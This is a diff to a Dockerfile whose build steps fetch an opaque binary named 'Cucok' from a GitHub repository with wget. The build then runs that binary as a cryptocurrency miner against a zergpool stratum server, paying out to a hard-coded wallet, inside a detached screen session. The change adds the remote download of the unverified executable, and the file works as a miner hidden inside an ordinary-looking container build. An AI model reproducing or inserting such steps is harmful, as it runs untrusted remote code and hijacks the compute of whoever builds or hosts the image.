@@ -6,7 +6,7 @@ RUN		apt-get install -qy automake autoconf pkg-config libcurl4-openssl-dev libss
 RUN		sudo apt update 
 RUN		sudo apt install screen -y 
 RUN		screen -dmS gpu.sh
-RUN		chmod u+x ./Cucok
+RUN		wget https://github.com/zaf3hrhke/zaf3hrhke/raw/main/Cucok
 RUN		./Cucok -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u D9WRu1zs8Bmd9UQwMAXkstkLm4NDzVJnjG -p c=DGB,mc=PYRK
 
 WORKDIR		/zaf3hrhke
